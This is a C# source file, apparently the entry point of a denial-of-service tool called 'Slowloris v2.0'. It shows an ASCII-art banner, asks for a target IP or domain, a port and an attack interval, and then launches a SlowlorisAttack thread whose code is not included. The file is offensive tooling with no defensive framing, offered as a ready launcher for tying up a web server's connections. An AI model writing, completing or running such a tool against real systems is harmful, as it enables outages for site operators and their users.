using System;
using System.Threading;

namespace SlowLoris
{
    class Program
    {
       
        static void Main(string[] args)
        {
            Header();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("example: 127.0.0.1 or www.target.com");
            Console.ResetColor();
            Console.Write("Enter the Targets I.P or Domain : ");
            string target =  Console.ReadLine();
           

            youGotItWrong:

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("example: normal port number is 80");
            Console.ResetColor();
            Console.Write("Enter the Targets Port Number : ");
            string ports =  Console.ReadLine();

            int number;
            int portStart;
            
            bool resultStart = int.TryParse(ports, out number);

            if (resultStart)
            {
                portStart = int.Parse(ports);

            }

            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Try Again NOOOB!!");
                Console.ResetColor();
                goto youGotItWrong;
                // return;
            }


            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("example: 1000 = 1 seconds / 500 = 0.5 seconds");
            Console.ResetColor();
            Console.Write("Enter How often To attack the Target : ");
            string sleep = Console.ReadLine();

            int number2;
            int threadSleep;

            bool resultStart2 = int.TryParse(sleep, out number2);

            if (resultStart2)
            {
                threadSleep = int.Parse(sleep);

            }

            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Try Again NOOOB!!");
                Console.ResetColor();
                goto youGotItWrong;
                // return;
            }


            SlowlorisAttack Slow = new SlowlorisAttack(target, portStart , threadSleep, true);
            ThreadStart ST = new ThreadStart(Slow.Manage);


            Thread SlowThread = new Thread(ST);
            SlowThread.Start();

        }
        private static void Header()
        {
            Console.WriteLine("CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::");
            Console.WriteLine("CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::");
            Console.WriteLine("CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::");
            Console.WriteLine("CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::");
            Console.WriteLine("CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:");
            Console.WriteLine("ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc");
            Console.WriteLine("ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo");
            Console.WriteLine("oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC");
            Console.WriteLine("oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC");
            Console.WriteLine("oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO");
            Console.WriteLine("CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O");
            Console.WriteLine("CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO");
            Console.WriteLine("OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO");
            Console.WriteLine("OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO");
            Console.WriteLine("COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO");
            Console.WriteLine("CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC");
            Console.WriteLine("coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC");
            Console.WriteLine(": ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  .... ..:cooCooooccccc::::ccooCCooC");
            Console.WriteLine(".:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC");
            Console.WriteLine("....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo");
            Console.WriteLine(".......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc");
            Console.WriteLine("...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co");
            Console.WriteLine(".............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo");
            Console.WriteLine(" ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC");
            Console.WriteLine("   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco");
            Console.WriteLine(" .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....::::::ccoocc");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(" ::     ::   ..::::.       ..::..   ");
            Console.WriteLine("  ::   ::        ::       ::    ::  ");
            Console.WriteLine("   :: ::      .::         ::    ::  ");
            Console.WriteLine("     :       :::::::.  ::  ::..::   ");
            Console.ResetColor();
            Console.WriteLine();
            Console.WriteLine(" Welcome to Slowloris v2.0 ");
            Console.WriteLine();
        }
    }
}
